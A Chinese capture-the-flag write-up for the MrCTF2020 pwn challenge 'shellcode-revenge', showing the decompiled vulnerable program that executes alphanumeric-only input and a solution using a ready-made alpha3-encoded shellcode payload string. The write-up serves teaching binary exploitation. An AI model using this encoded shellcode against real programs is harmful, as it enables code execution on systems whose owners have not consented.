
## shellcode-revenge
- 题目描述：
    
> 你的麦基客似乎没用了
    
- 题目附件：[shellcode-revenge](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MrCTF2020/pwn/shellcode-revenge/shellcode-revenge)
- 考察点：aplha shellcode
- 难度：简单
- 初始分值：500
- 最终分值：448
- 完成人数：18

### 程序分析

> IDA没有识别出来`call rax`，所以直接F5会失败。用ghidra就没问题~

```c
undefined8 main(void){
  ssize_t sVar1;
  undefined buf [1032];
  int len;
  int i;
  
  write(1,"Show me your magic!\n",0x14);
  sVar1 = read(0,buf,0x400);
  len = (int)sVar1;
  if (0 < len) {
    i = 0;
    while (i < len) {
      if (((((char)buf[i] < 'a') || ('z' < (char)buf[i])) &&
          (((char)buf[i] < 'A' || ('Z' < (char)buf[i])))) &&
         (((char)buf[i] < '0' || ('Z' < (char)buf[i])))) {
        printf("I Can\'t Read This!");
        return 0;
      }
      i = i + 1;
    }
    (*(code *)buf)();
  }
  return 0;
}
```

对输入进行了限制，基本上只能使用可见字符做shellcode.

### 解题思路

直接用`alpha3`生成`shellcode`即可。

有关纯字符shellcode的介绍可以看我的这篇文章：[纯字符shellcode生成指南](http://taqini.space/2020/03/31/alpha-shellcode-gen/#x86-alpha%E7%BC%96%E7%A0%81)

### exp

```python
payload = 'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'
se(payload)
```

